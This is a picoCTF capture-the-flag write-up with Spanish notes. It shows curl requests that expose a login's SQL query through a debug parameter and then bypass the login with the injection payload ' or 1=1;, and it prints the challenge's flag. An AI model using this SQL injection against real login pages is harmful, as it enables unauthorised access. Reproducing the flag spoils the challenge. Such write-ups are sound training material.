# Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
# Solución
```
username: admin
password: password
SQL query: SELECT * FROM users WHERE name='admin' AND password='password'
Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}


-----------------------------------------------

┌──(kalicura㉿rufian)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.html
^C
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.php  
^C
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=ola"
<h1>Login failed.</h1>                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=ola&debug=1"
<pre>username: admin
password: ola
SQL query: SELECT * FROM users WHERE name='admin' AND password='ola'
</pre><h1>Login failed.</h1>                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=' or password=1"
                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=' or 1=1;"      
<h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>                                                                                                                                                                      
┌──(kalicura㉿rufian)-[~]
└─$ 
```
# Notas
- Al cambiar el valor de una variable en el código fuente de la página se puede acceder para obtener el usuario y contraseña
- De manera alternativa, podemos usar el usuario ==' or 1=1;== para forzar que el resultado de la consulta en SQL sea 1 y nos de la flag
- Otra forma es hacerlo directamente en consola
# Referencia